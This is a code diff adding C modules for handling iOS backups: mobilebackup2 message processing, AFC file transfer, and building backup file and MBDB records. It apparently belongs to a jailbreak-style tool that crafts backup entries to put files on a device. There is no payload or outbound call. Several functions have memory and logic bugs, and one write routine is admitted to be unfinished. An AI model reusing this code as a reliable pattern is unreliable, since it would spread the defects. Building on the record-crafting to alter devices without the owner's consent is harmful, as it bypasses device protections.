+                    plist_dict_iter iter = NULL;
+                    plist_dict_new_iter(moves, &iter);
+                    errcode = 0;
+                    errdesc = NULL;
+                    if (iter) {
+                        char *key = NULL;
+                        plist_t val = NULL;
+                        do {
+                            plist_dict_next_item(moves, iter, &key, &val);
+                            if (key
+                                && (plist_get_node_type(val) == PLIST_STRING)) {
+                                char *str = NULL;
+                                plist_get_string_val(val, &str);
+                                if (str) {
+                                    char *newpath =
+                                        build_path(backup_directory, str, NULL);
+                                    free(str);
+                                    char *oldpath =
+                                        build_path(backup_directory, key, NULL);
+
+#ifdef WIN32
+                                    if ((stat(newpath, &st) == 0)
+                                        && S_ISDIR(st.st_mode))
+                                        RemoveDirectory(newpath);
+                                    else
+                                        DeleteFile(newpath);
+#else
+                                    remove(newpath);
+#endif
+                                    if (rename(oldpath, newpath) < 0) {
+                                        printf
+                                            ("Renameing '%s' to '%s' failed: %s (%d)\n",
+                                             oldpath, newpath, strerror(errno),
+                                             errno);
+                                        errcode = errno_to_device_error(errno);
+                                        errdesc = strerror(errno);
+                                        break;
+                                    }
+                                    free(oldpath);
+                                    free(newpath);
+                                }
+                                free(key);
+                                key = NULL;
+                            }
+                        } while (val);
+                        free(iter);
+                    } else {
+                        errcode = -1;
+                        errdesc = "Could not create dict iterator";
+                        printf("Could not create dict iterator\n");
+                    }
+                    plist_t empty_dict = plist_new_dict();
+                    err =
+                        mobilebackup2_send_status_response(mobilebackup2,
+                                                           errcode, errdesc,
+                                                           empty_dict);
+                    plist_free(empty_dict);
+                    if (err != MOBILEBACKUP2_E_SUCCESS) {
+                        printf("Could not send status response, error %d\n",
+                               err);
+                    }
+                } else if (!strcmp(dlmsg, "DLMessageRemoveFiles")
+                           || !strcmp(dlmsg, "DLMessageRemoveItems")) {
+                    mb2_set_overall_progress_from_message(message, dlmsg);
+                    plist_t removes = plist_array_get_item(message, 1);
+                    uint32_t cnt = plist_array_get_size(removes);
+                    PRINT_VERBOSE(1, "Removing %d file%s\n", cnt,
+                                  (cnt == 1) ? "" : "s");
+                    uint32_t ii = 0;
+                    errcode = 0;
+                    errdesc = NULL;
+                    for (ii = 0; ii < cnt; ii++) {
+                        plist_t val = plist_array_get_item(removes, ii);
+                        if (plist_get_node_type(val) == PLIST_STRING) {
+                            char *str = NULL;
+                            plist_get_string_val(val, &str);
+                            if (str) {
+                                const char *checkfile = strchr(str, '/');
+                                int suppress_warning = 0;
+                                if (checkfile) {
+                                    if (strcmp(checkfile + 1, "Manifest.mbdx")
+                                        == 0) {
+                                        suppress_warning = 1;
+                                    }
+                                }
+                                char *newpath =
+                                    build_path(backup_directory, str, NULL);
+                                free(str);
+#ifdef WIN32
+                                int res = 0;
+                                if ((stat(newpath, &st) == 0)
+                                    && S_ISDIR(st.st_mode))
+                                    res = RemoveDirectory(newpath);
+                                else
+                                    res = DeleteFile(newpath);
+                                if (!res) {
+                                    int e = win32err_to_errno(GetLastError());
+                                    if (!suppress_warning)
+                                        printf
+                                            ("Could not remove '%s': %s (%d)\n",
+                                             newpath, strerror(e), e);
+                                    errcode = errno_to_device_error(e);
+                                    errdesc = strerror(e);
+                                }
+#else
+                                if (remove(newpath) < 0) {
+                                    if (!suppress_warning)
+                                        printf
+                                            ("Could not remove '%s': %s (%d)\n",
+                                             newpath, strerror(errno), errno);
+                                    errcode = errno_to_device_error(errno);
+                                    errdesc = strerror(errno);
+                                }
+#endif
+                                free(newpath);
+                            }
+                        }
+                    }
+                    plist_t empty_dict = plist_new_dict();
+                    err =
+                        mobilebackup2_send_status_response(mobilebackup2,
+                                                           errcode, errdesc,
+                                                           empty_dict);
+                    plist_free(empty_dict);
+                    if (err != MOBILEBACKUP2_E_SUCCESS) {
+                        printf("Could not send status response, error %d\n",
+                               err);
+                    }
+                } else if (!strcmp(dlmsg, "DLMessageCopyItem")) {
+                    plist_t srcpath = plist_array_get_item(message, 1);
+                    plist_t dstpath = plist_array_get_item(message, 2);
+                    errcode = 0;
+                    errdesc = NULL;
+                    if ((plist_get_node_type(srcpath) == PLIST_STRING)
+                        && (plist_get_node_type(dstpath) == PLIST_STRING)) {
+                        char *src = NULL;
+                        char *dst = NULL;
+                        plist_get_string_val(srcpath, &src);
+                        plist_get_string_val(dstpath, &dst);
+                        if (src && dst) {
+                            char *oldpath =
+                                build_path(backup_directory, src, NULL);
+                            char *newpath =
+                                build_path(backup_directory, dst, NULL);
+
+                            PRINT_VERBOSE(1, "Copying '%s' to '%s'\n", src,
+                                          dst);
+
+                            /* check that src exists */
+                            if ((stat(oldpath, &st) == 0)
+                                && S_ISDIR(st.st_mode)) {
+                                mb2_copy_directory_by_path(oldpath, newpath);
+                            } else if ((stat(oldpath, &st) == 0)
+                                       && S_ISREG(st.st_mode)) {
+                                mb2_copy_file_by_path(oldpath, newpath);
+                            }
+
+                            free(newpath);
+                            free(oldpath);
+                        }
+                        free(src);
+                        free(dst);
+                    }
+                    plist_t empty_dict = plist_new_dict();
+                    err =
+                        mobilebackup2_send_status_response(mobilebackup2,
+                                                           errcode, errdesc,
+                                                           empty_dict);
+                    plist_free(empty_dict);
+                    if (err != MOBILEBACKUP2_E_SUCCESS) {
+                        printf("Could not send status response, error %d\n",
+                               err);
+                    }
+                } else if (!strcmp(dlmsg, "DLMessageDisconnect")) {
+                    break;
+                } else if (!strcmp(dlmsg, "DLMessageProcessMessage")) {
+                    node_tmp = plist_array_get_item(message, 1);
+                    if (plist_get_node_type(node_tmp) != PLIST_DICT) {
+                        printf("Unknown message received!\n");
+                    }
+                    plist_t nn;
+                    int error_code = -1;
+                    nn = plist_dict_get_item(node_tmp, "ErrorCode");
+                    if (nn && (plist_get_node_type(nn) == PLIST_UINT)) {
+                        uint64_t ec = 0;
+                        plist_get_uint_val(nn, &ec);
+                        error_code = (uint32_t) ec;
+                        if (error_code == 0) {
+                            operation_ok = 1;
+                            result_code = 0;
+                        } else {
+                            result_code = -error_code;
+                        }
+                    }
+                    nn = plist_dict_get_item(node_tmp, "ErrorDescription");
+                    char *str = NULL;
+                    if (nn && (plist_get_node_type(nn) == PLIST_STRING)) {
+                        plist_get_string_val(nn, &str);
+                    }
+                    if (error_code != 0) {
+                        if (str) {
+                            printf("ErrorCode %d: %s\n", error_code, str);
+                        } else {
+                            printf("ErrorCode %d: (Unknown)\n", error_code);
+                        }
+                    }
+                    if (str) {
+                        free(str);
+                    }
+                    nn = plist_dict_get_item(node_tmp, "Content");
+                    if (nn && (plist_get_node_type(nn) == PLIST_STRING)) {
+                        str = NULL;
+                        plist_get_string_val(nn, &str);
+                        PRINT_VERBOSE(1, "Content:\n");
+                        printf("%s", str);
+                        free(str);
+                    }
+
+                    break;
+                }
+
+                /* print status */
+                if (overall_progress > 0) {
+                    print_progress_real(overall_progress, 0);
+                    PRINT_VERBOSE(1, " Finished\n");
+                }
+
+                if (message)
+                    plist_free(message);
+                message = NULL;
+
+ files_out:
+                if (quit_flag > 0) {
+                    /* need to cancel the backup here */
+                    //mobilebackup_send_error(mobilebackup, "Cancelling DLSendFile");
+
+                    /* remove any atomic Manifest.plist.tmp */
+
+                    /*manifest_path = mobilebackup_build_path(backup_directory, "Manifest", ".plist.tmp");
+                       if (stat(manifest_path, &st) == 0)
+                       remove(manifest_path); */
+                    break;
+                }
+            } while (1);
+
+            /* report operation status to user */
+            switch (cmd) {
+            case CMD_BACKUP:
+                PRINT_VERBOSE(1, "Received %d files from device.\n",
+                              file_count);
+                if (operation_ok
+                    && mb2_status_check_snapshot_state(backup_directory, udid,
+                                                       "finished")) {
+                    PRINT_VERBOSE(1, "Backup Successful.\n");
+                } else {
+                    if (quit_flag) {
+                        PRINT_VERBOSE(1, "Backup Aborted.\n");
+                    } else {
+                        PRINT_VERBOSE(1, "Backup Failed (Error Code %d).\n",
+                                      -result_code);
+                    }
+                }
+                break;
+            case CMD_UNBACK:
+                if (quit_flag) {
+                    PRINT_VERBOSE(1, "Unback Aborted.\n");
+                } else {
+                    PRINT_VERBOSE(1,
+                                  "The files can now be found in the \"_unback_\" directory.\n");
+                    PRINT_VERBOSE(1, "Unback Successful.\n");
+                }
+                break;
+            case CMD_CHANGEPW:
+                if (cmd_flags & CMD_FLAG_ENCRYPTION_ENABLE) {
+                    if (operation_ok) {
+                        PRINT_VERBOSE(1,
+                                      "Backup encryption has been enabled successfully.\n");
+                    } else {
+                        PRINT_VERBOSE(1,
+                                      "Could not enable backup encryption.\n");
+                    }
+                } else if (cmd_flags & CMD_FLAG_ENCRYPTION_DISABLE) {
+                    if (operation_ok) {
+                        PRINT_VERBOSE(1,
+                                      "Backup encryption has been disabled successfully.\n");
+                    } else {
+                        PRINT_VERBOSE(1,
+                                      "Could not disable backup encryption.\n");
+                    }
+                } else if (cmd_flags & CMD_FLAG_ENCRYPTION_CHANGEPW) {
+                    if (operation_ok) {
+                        PRINT_VERBOSE(1,
+                                      "Backup encryption password has been changed successfully.\n");
+                    } else {
+                        PRINT_VERBOSE(1,
+                                      "Could not change backup encryption password.\n");
+                    }
+                }
+                break;
+            case CMD_RESTORE:
+                if (cmd_flags & CMD_FLAG_RESTORE_REBOOT)
+                    PRINT_VERBOSE(1, "The device should reboot now.\n");
+                if (operation_ok) {
+                    PRINT_VERBOSE(1, "Restore Successful.\n");
+                } else {
+                    PRINT_VERBOSE(1, "Restore Failed (Error Code %d).\n",
+                                  -result_code);
+                }
+
+                break;
+            case CMD_INFO:
+            case CMD_LIST:
+            case CMD_LEAVE:
+            default:
+                if (quit_flag) {
+                    PRINT_VERBOSE(1, "Operation Aborted.\n");
+                } else if (cmd == CMD_LEAVE) {
+                    PRINT_VERBOSE(1, "Operation Failed.\n");
+                } else {
+                    PRINT_VERBOSE(1, "Operation Successful.\n");
+                }
+                break;
+            }
+        }
+        if (lockfile) {
+            afc_file_lock(afc, lockfile, AFC_LOCK_UN);
+            afc_file_close(afc, lockfile);
+            lockfile = 0;
+            if (cmd == CMD_BACKUP)
+                do_post_notification(device, NP_SYNC_DID_FINISH);
+        }
+    } else {
+        printf("ERROR: Could not start service %s.\n",
+               MOBILEBACKUP2_SERVICE_NAME);
+        lockdownd_client_free(lockdown);
+        lockdown = NULL;
+    }
+
+    if (lockdown) {
+        lockdownd_client_free(lockdown);
+        lockdown = NULL;
+    }
+
+    if (mobilebackup2) {
+        mobilebackup2_client_free(mobilebackup2);
+        mobilebackup2 = NULL;
+    }
+
+    if (afc) {
+        afc_client_free(afc);
+        afc = NULL;
+    }
+
+    if (np) {
+        np_client_free(np);
+        np = NULL;
+    }
+
+    idevice_free(device);
+    device = NULL;
+
+    if (udid) {
+        free(udid);
+        udid = NULL;
+    }
+    if (source_udid) {
+        free(source_udid);
+        source_udid = NULL;
+    }
+
+    return result_code;
+}
+/**
+ * afc.c
+ * Copyright (C) 2010 Joshua Hill
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ **/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <libimobiledevice/afc.h>
+
+#include "common.h"
+
+afc_t *afc_create()
+{
+    afc_t *afc = (afc_t *) malloc(sizeof(afc_t));
+    if (afc != NULL) {
+        memset(afc, '\0', sizeof(afc));
+    }
+    return afc;
+}
+
+afc_t *afc_connect(device_t * device)
+{
+    int err = 0;
+    uint16_t port = 0;
+    afc_t *afc = NULL;
+    lockdown_t *lockdown = NULL;
+
+    lockdown = lockdown_open(device);
+    if (lockdown == NULL) {
+        ERROR("Unable to open connection to lockdownd\n");
+        return NULL;
+    }
+
+    err = lockdown_start_service(lockdown, "com.apple.afc", &port);
+    if (err < 0) {
+        ERROR("Unable to start AFC service\n");
+        return NULL;
+    }
+    lockdown_close(lockdown);
+
+    afc = afc_open(device, port);
+    if (afc == NULL) {
+        ERROR("Unable to open connection to AFC service\n");
+        return NULL;
+    }
+
+    return afc;
+}
+
+afc_t *afc_open(device_t * device, uint16_t port)
+{
+    afc_error_t err = AFC_E_SUCCESS;
+    afc_t *afc = afc_create();
+    if (afc != NULL) {
+        lockdownd_service_descriptor_t desc =
+            malloc(sizeof(struct lockdownd_service_descriptor));
+
+        if (!desc)
+            return NULL;
+        memset(desc, '\0', sizeof(struct lockdownd_service_descriptor));
+
+        desc->port = port;
+
+        DEBUG("Service %p\n", desc);
+
+        err = afc_client_new(device->client, desc, &(afc->client));
+        if (err != AFC_E_SUCCESS) {
+            WARN("Unable to create new AFC client\n");
+            afc_free(afc);
+            return NULL;
+        }
+        afc->device = device;
+        afc->port = port;
+    }
+    return afc;
+}
+
+int afc_close(afc_t * afc)
+{
+    //TODO: Implement Me
+    return -1;
+}
+
+void afc_free(afc_t * afc)
+{
+    if (afc) {
+        free(afc);
+    }
+}
+
+void afc_free_dictionary(char **dictionary) //ghetto i know, not sure where/how to put a global function for this
+{
+    int i = 0;
+
+    if (!dictionary)
+        return;
+
+    for (i = 0; dictionary[i]; i++) {
+        free(dictionary[i]);
+    }
+    free(dictionary);
+}
+
+void apparition_afc_get_file_contents(afc_t * afc, const char *filename,
+                                      char **data, uint64_t * size)
+{
+    if (!afc || !data || !size) {
+        return;
+    }
+
+    char **fileinfo = NULL;
+    uint32_t fsize = 0;
+
+    afc_get_file_info(afc->client, filename, &fileinfo);
+    if (!fileinfo) {
+        return;
+    }
+    int i;
+    for (i = 0; fileinfo[i]; i += 2) {
+        if (!strcmp(fileinfo[i], "st_size")) {
+            fsize = atol(fileinfo[i + 1]);
+            break;
+        }
+    }
+    afc_free_dictionary(fileinfo);
+
+    if (fsize == 0) {
+        return;
+    }
+
+    uint64_t f = 0;
+    afc_file_open(afc->client, filename, AFC_FOPEN_RDONLY, &f);
+    if (!f) {
+        return;
+    }
+    char *buf = (char *)malloc((uint32_t) fsize);
+    uint32_t done = 0;
+    while (done < fsize) {
+        uint32_t bread = 0;
+        afc_file_read(afc->client, f, buf + done, 65536, &bread);
+        if (bread > 0) {
+
+        } else {
+            break;
+        }
+        done += bread;
+    }
+    if (done == fsize) {
+        *size = fsize;
+        *data = buf;
+    } else {
+        free(buf);
+    }
+    afc_file_close(afc->client, f);
+}
+
+int afc_send_file(afc_t * afc, const char *local, const char *remote)
+{
+
+    uint64_t lockfile = 0;
+    uint64_t my_file = 0;
+    unsigned int bytes = 0;
+
+    afc_file_open(afc->client, remote, AFC_FOPEN_WR, &my_file);
+    if (my_file) {
+        //char *outdatafile = strdup("THIS IS HOW WE DO IT, WHORE\n");
+
+        //FIXME: right here its just sending "local/file.txt, rather than the contents of the file.
+
+        //afc_file_write(afc->client, my_file, outdatafile, strlen(outdatafile), &bytes);// <-- old code
+        afc_file_write(afc->client, my_file, local, strlen(local), &bytes);
+        //free(outdatafile);
+        if (bytes > 0)
+            printf("File transferred successfully\n");
+        else
+            printf("File write failed!!! :(\n");
+        afc_file_close(afc->client, my_file);
+    }
+
+    printf("afc all done.\n");
+
+    return 0;
+}
+/**
+  * backup_file.c
+  * Copyright (C) 2010 Joshua Hill
+  * Copyright (C) 2012 Hanéne Samara
+  *
+  * This program is free software: you can redistribute it and/or modify
+  * it under the terms of the GNU General Public License as published by
+  * the Free Software Foundation, either version 3 of the License, or
+  * (at your option) any later version.
+  *
+  * This program is distributed in the hope that it will be useful,
+  * but WITHOUT ANY WARRANTY; without even the implied warranty of
+  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+  * GNU General Public License for more details.
+  *
+  * You should have received a copy of the GNU General Public License
+  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ **/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#include <openssl/sha.h>
+
+#include "common.h"
+
+static backup_file_t *backup_file_new()
+{
+    backup_file_t *file = (backup_file_t *) malloc(sizeof(backup_file_t));
+    if (file == NULL) {
+        ERROR("Allocation Error\n");
+        return NULL;
+    }
+    memset(file, '\0', sizeof(backup_file_t));
+    return file;
+}
+
+backup_file_t *backup_file_create(const char *filepath)
+{
+    backup_file_t *file = backup_file_new();
+    if (filepath) {
+        file->filepath = strdup(filepath);
+    }
+    file->mbdb_record = mbdb_record_create();
+    mbdb_record_init(file->mbdb_record);
+    return file;
+}
+
+backup_file_t *backup_file_create_with_data(unsigned char *data,
+                                            unsigned int size, int copy)
+{
+    backup_file_t *file = backup_file_new();
+    if (!file) {
+        return NULL;
+    }
+    file->mbdb_record = mbdb_record_create();
+    mbdb_record_init(file->mbdb_record);
+    backup_file_assign_file_data(file, data, size, copy);
+    return file;
+}
+
+backup_file_t *backup_file_create_from_record(mbdb_record_t * record)
+{
+    if (!record) {
+        return NULL;
+    }
+    backup_file_t *file = backup_file_new();
+    if (!file)
+        return NULL;
+
+    file->mbdb_record = (mbdb_record_t *) malloc(sizeof(mbdb_record_t));
+    if (file->mbdb_record == NULL) {
+        ERROR("Allocation Error\n");
+        return NULL;
+    }
+    // we need to make a real copy of the record
+    memcpy(file->mbdb_record, record, sizeof(mbdb_record_t));
+    if (record->domain) {
+        file->mbdb_record->domain = strdup(record->domain);
+    }
+    if (record->path) {
+        file->mbdb_record->path = strdup(record->path);
+    }
+    if (record->target) {
+        file->mbdb_record->target = strdup(record->target);
+    }
+    if (record->datahash) {
+        file->mbdb_record->datahash = (char *)malloc(record->datahash_size);
+        memcpy(file->mbdb_record->datahash, record->datahash,
+               record->datahash_size);
+    }
+    if (record->unknown1) {
+        file->mbdb_record->unknown1 = (char *)malloc(record->unknown1_size);
+        memcpy(file->mbdb_record->unknown1, record->unknown1,
+               record->unknown1_size);
+    }
+    if (record->property_count > 0) {
+        file->mbdb_record->properties =
+            (mbdb_record_property_t **) malloc(sizeof(mbdb_record_property_t *)
+                                               * record->property_count);
+        int i;
+        for (i = 0; i < record->property_count; i++) {
+            mbdb_record_property_t *prop =
+                malloc(sizeof(mbdb_record_property_t));
+            prop->name_size = record->properties[i]->name_size;
+            prop->name = (char *)malloc(prop->name_size + 1);
+            memcpy(prop->name, record->properties[i]->name, prop->name_size);
+            prop->value_size = record->properties[i]->value_size;
+            prop->value = (char *)malloc(prop->value_size + 1);
+            memcpy(prop->value, record->properties[i]->value, prop->value_size);
+        }
+    }
+
+    return file;
+}
+
+void backup_file_assign_file_data(backup_file_t * bfile, unsigned char *data,
+                                  unsigned int size, int copy)
+{
+    if (copy) {
+        bfile->data = malloc(size);
+        memcpy(bfile->data, data, size);
+        bfile->size = size;
+        bfile->free_data = 1;
+    } else {
+        bfile->data = data;
+        bfile->size = size;
+        bfile->free_data = 0;
+    }
+    if (bfile->filepath) {
+        free(bfile->filepath);
+        bfile->filepath = NULL;
+    }
+}
+
+void backup_file_assign_file_path(backup_file_t * bfile, unsigned char *path)
+{
+    if (bfile->data && bfile->free_data) {
+        free(bfile->data);
+        bfile->data = NULL;
+        bfile->free_data = 0;
+    }
+    if (bfile->filepath) {
+        free(bfile->filepath);
+    }
+    bfile->filepath = strdup(path);
+}
+
+void backup_file_free(backup_file_t * file)
+{
+    if (file) {
+        if (file->mbdb_record) {
+            mbdb_record_free(file->mbdb_record);
+        }
+        if (file->filepath) {
+            free(file->filepath);
+        }
+        if (file->data && file->free_data) {
+            free(file->data);
+        }
+        free(file);
+    }
+}
+
+void backup_file_set_domain(backup_file_t * bfile, const char *domain)
+{
+    if (!bfile)
+        return;
+    mbdb_record_set_domain(bfile->mbdb_record, domain);
+}
+
+void backup_file_set_path(backup_file_t * bfile, const char *path)
+{
+    if (!bfile)
+        return;
+    mbdb_record_set_path(bfile->mbdb_record, path);
+}
+
+void backup_file_set_target(backup_file_t * bfile, const char *target)
+{
+    if (!bfile)
+        return;
+    mbdb_record_set_target(bfile->mbdb_record, target);
+}
+
+static void debug_hash(const unsigned char *hash, int len)
+{
+    int i;
+    for (i = 0; i < len; i++) {
+        printf("%02x", hash[i]);
+    }
+    printf("\n");
+}
+
+void backup_file_update_hash(backup_file_t * bfile)
+{
+    if (!bfile)
+        return;
+    if (bfile->filepath) {
+        FILE *f = fopen(bfile->filepath, "rb");
+        if (!f) {
+            ERROR("%s: ERROR: Could not open file '%s'\n", __func__,
+                  bfile->filepath);
+        }
+        unsigned char buf[8192];
+        size_t bytes;
+        unsigned char sha1[20] = { 0, };
+        SHA_CTX shactx;
+        SHA1_Init(&shactx);
+        while (!feof(f)) {
+            bytes = fread(buf, 1, sizeof(buf), f);
+            if (bytes > 0) {
+                SHA1_Update(&shactx, buf, bytes);
+            }
+        }
+        SHA1_Final(sha1, &shactx);
+        fclose(f);
+        DEBUG("setting datahash to ");
+        debug_hash(sha1, 20);
+        mbdb_record_set_datahash(bfile->mbdb_record, sha1, 20);
+    } else if (bfile->data) {
+        unsigned char sha1[20] = { 0, };
+        SHA1(bfile->data, bfile->size, sha1);
+        DEBUG("setting datahash to ");
+        debug_hash(sha1, 20);
+        mbdb_record_set_datahash(bfile->mbdb_record, sha1, 20);
+    } else {
+        ERROR
+            ("%s: ERROR: neither filename nor data given, setting hash to N/A\n",
+             __func__);
+        mbdb_record_set_datahash(bfile->mbdb_record, NULL, 0);
+    }
+}
+
+void backup_file_disable_hash(backup_file_t * bfile)
+{
+    if (!bfile)
+        return;
+    mbdb_record_set_datahash(bfile->mbdb_record, NULL, 0);
+}
+
+void backup_file_set_mode(backup_file_t * bfile, unsigned short mode)
+{
+    if (!bfile)
+        return;
+    mbdb_record_set_mode(bfile->mbdb_record, mode);
+}
+
+void backup_file_set_inode(backup_file_t * bfile, unsigned int inode)
+{
+    if (!bfile)
+        return;
+    mbdb_record_set_inode(bfile->mbdb_record, inode);
+}
+
+void backup_file_set_uid(backup_file_t * bfile, unsigned int uid)
+{
+    if (!bfile)
+        return;
+    mbdb_record_set_uid(bfile->mbdb_record, uid);
+}
+
+void backup_file_set_gid(backup_file_t * bfile, unsigned int gid)
+{
+    if (!bfile)
+        return;
+    mbdb_record_set_gid(bfile->mbdb_record, gid);
+}
+
+void backup_file_set_time1(backup_file_t * bfile, unsigned int time1)
+{
+    if (!bfile)
+        return;
+    mbdb_record_set_time1(bfile->mbdb_record, time1);
+}
+
+void backup_file_set_time2(backup_file_t * bfile, unsigned int time2)
+{
+    if (!bfile)
+        return;
+    mbdb_record_set_time2(bfile->mbdb_record, time2);
+}
+
+void backup_file_set_time3(backup_file_t * bfile, unsigned int time3)
+{
+    if (!bfile)
+        return;
+    mbdb_record_set_time3(bfile->mbdb_record, time3);
+}
+
+void backup_file_set_length(backup_file_t * bfile, unsigned long long length)
+{
+    if (!bfile)
+        return;
+    mbdb_record_set_length(bfile->mbdb_record, length);
+}
+
+void backup_file_set_flag(backup_file_t * bfile, unsigned char flag)
+{
+    if (!bfile)
+        return;
+    mbdb_record_set_flag(bfile->mbdb_record, flag);
+}
+
+int backup_file_get_record_data(backup_file_t * bfile, unsigned char **data,
+                                unsigned int *size)
+{
+    if (!bfile)
+        return;
+    if (!bfile->mbdb_record) {
+        ERROR("%s: ERROR: no mbdb_record present\n", __func__);
+        return -1;
+    }
+
+    if (mbdb_record_build(bfile->mbdb_record, data, size) < 0) {
+        ERROR("%s: ERROR: could not build mbdb_record data\n", __func__);
+        return -1;
+    }
+
+    return 0;
+}
+/**
+  * file.c
+  * Copyright (C) 2010 Joshua Hill
+  *
+  * This program is free software: you can redistribute it and/or modify
+  * it under the terms of the GNU General Public License as published by
+  * the Free Software Foundation, either version 3 of the License, or
+  * (at your option) any later version.
+  *
+  * This program is distributed in the hope that it will be useful,
+  * but WITHOUT ANY WARRANTY; without even the implied warranty of
+  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+  * GNU General Public License for more details.
+  *
+  * You should have received a copy of the GNU General Public License
+  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ **/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#include "common.h"
+
+#define BUFSIZE 4096
+
+file_t *file_create()
+{
+    file_t *file = (file_t *) malloc(sizeof(file_t));
+    if (file) {
+        memset(file, '\0', sizeof(file_t));
+    }
+    return file;
+}
+
+file_t *file_open(const char *path)
+{
+    uint64_t got = 0;
+    uint8_t buffer[4096];
+
+    file_t *file = file_create();
+    if (file) {
+        file->desc = fopen(path, "rb");
+        if (file->desc == NULL) {
+            fprintf(stderr, "Unable to open file %s\n", path);
+            return NULL;
+        }
+
+        file->path = strdup(path);
+        if (file->path == NULL) {
+            fprintf(stderr, "Unable to allocate memory for file path\n");
+            file_free(file);
+            return NULL;
+        }
+
+        fseek(file->desc, 0, SEEK_END);
+        file->size = ftell(file->desc);
+        fseek(file->desc, 0, SEEK_SET);
+
+        file->offset = 0;
+        file->data = (unsigned char *)malloc(file->size);
+        if (file->data == NULL) {
+            fprintf(stderr, "Unable to allocate memory for file\n");
+            file_free(file);
+            return NULL;
+        }
+
+        uint64_t offset = 0;
+        while (offset < file->size) {
+            memset(buffer, '\0', BUFSIZE);
+            got = fread(buffer, 1, BUFSIZE, file->desc);
+            if (got > 0) {
+                offset += got;
+                memcpy(&(file->data[offset]), buffer, got);
+            } else {
+                break;
+            }
+        }
+        fprintf(stderr, "Read in %llu of %llu bytes from %s\n", file->offset,
+                file->size, file->path);
+        // We have the data stored in memory now, so we don't need to keep this open anymore
+        //fseek(file->desc, 0, SEEK_SET);
+        file_close(file);
+        file->offset = 0;
+    }
+    return file;
+}
+
+void file_close(file_t * file)
+{
+    if (file) {
+        if (file->desc) {
+            fclose(file->desc);
+            file->desc = NULL;
+        }
+    }
+}
+
+void file_free(file_t * file)
+{
+    if (file) {
+        if (file->desc) {
+            file_close(file);
+            file->desc = NULL;
+        }
+        if (file->path) {
+            free(file->path);
+            file->path = NULL;
+        }
+        if (file->data) {
+            free(file->data);
+            file->data = NULL;
+        }
+        file->size = 0;
+        file->offset = 0;
+        free(file);
+    }
+}
+
+int file_read(const char *file, unsigned char **buf, unsigned int *length)
+{
+    FILE *fd = NULL;
+    fd = fopen(file, "rb");
+    if (fd == NULL) {
+        return -1;
+    }
+
+    fseek(fd, 0, SEEK_END);
+    long size = ftell(fd);
+    fseek(fd, 0, SEEK_SET);
+
+    unsigned char *data = malloc(size);
+
+    int bytes = fread(data, 1, size, fd);
+    if (bytes != size) {
+        fclose(fd);
+        return -1;
+    }
+    fclose(fd);
+
+    *buf = data;
+    *length = bytes;
+    return bytes;
+}
+
+int file_write(const char *file, unsigned char *buf, unsigned int length)
+{
+    FILE *fd = NULL;
+    fd = fopen(file, "wb");
+    if (fd == NULL) {
+        return -1;
+    }
+
+    int bytes = fwrite(buf, 1, length, fd);
+    if (bytes != length) {
+        fclose(fd);
+        return -1;
+    }
+    fclose(fd);
+    return bytes;
+}
+
+int file_copy(const char *from, const char *to)
+{
+    FILE *ffr = NULL;
+    FILE *fto = NULL;
+    char buf[8192];
+    size_t size;
+
+    ffr = fopen(from, "rb");
+    if (ffr == NULL) {
+        fprintf(stderr, "could not open source file '%s' for reading\n", from);
+        return -1;
+    }
+    fto = fopen(to, "wb");
+    if (fto == NULL) {
+        fprintf(stderr, "could not open target file '%s' for writing\n", to);
+        fclose(ffr);
+        return -1;
+    }
+
+    while (!feof(ffr)) {
+        size = fread(buf, 1, sizeof(buf), ffr);
+        if (size > 0) {
+            size_t bytes = fwrite(buf, 1, size, fto);
+            if (bytes != size) {
+                fclose(fto);
+                fclose(ffr);
+                return -1;
+            }
+        }
+    }
+    fclose(fto);
+    fclose(ffr);
+
+    return 0;
+}
+/**
+  * mbdb.c
+  * Copyright (C) 2010 Joshua Hill
+  * Copyright (C) 2012 Hanéne Samara
+  *
+  * This program is free software: you can redistribute it and/or modify
+  * it under the terms of the GNU General Public License as published by
+  * the Free Software Foundation, either version 3 of the License, or
+  * (at your option) any later version.
+  *
+  * This program is distributed in the hope that it will be useful,
+  * but WITHOUT ANY WARRANTY; without even the implied warranty of
+  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+  * GNU General Public License for more details.
+  *
+  * You should have received a copy of the GNU General Public License
+  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ **/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#include "common.h"
+
+mbdb_t *mbdb_create()
+{
+    mbdb_t *mbdb = NULL;
+
+    mbdb = (mbdb_t *) malloc(sizeof(mbdb_t));
+    if (mbdb == NULL) {
+        return NULL;
+    }
+    memset(mbdb, '\0', sizeof(mbdb_t));
+    return mbdb;
+}
+
+mbdb_t *mbdb_parse(unsigned char *data, unsigned int size)
+{
+    int i = 0;
+    unsigned int count = 0;
+    unsigned int offset = 0;
+
+    mbdb_t *mbdb = NULL;
+    mbdb_header_t *header = NULL;
+    mbdb_record_t *record = NULL;
+
+    mbdb = mbdb_create();
+    if (mbdb == NULL) {
+        ERROR("Unable to create mbdb\n");
+        return NULL;
+    }
+
+    header = (mbdb_header_t *) data;
+    if (strncmp(header->magic, MBDB_MAGIC, 6) != 0) {
+        ERROR("Unable to identify this filetype\n");
+        return NULL;
+    }
+    // Copy in our header data
+    mbdb->header = (mbdb_header_t *) malloc(sizeof(mbdb_header_t));
+    if (mbdb->header == NULL) {
+        ERROR("Allocation error\n");
+        return NULL;
+    }
+    memset(mbdb->header, '\0', sizeof(mbdb_header_t));
+    memcpy(mbdb->header, &data[offset], sizeof(mbdb_header_t));
+    offset += sizeof(mbdb_header_t);
+
+    mbdb->data = (unsigned char *)malloc(size);
+    if (mbdb->data == NULL) {
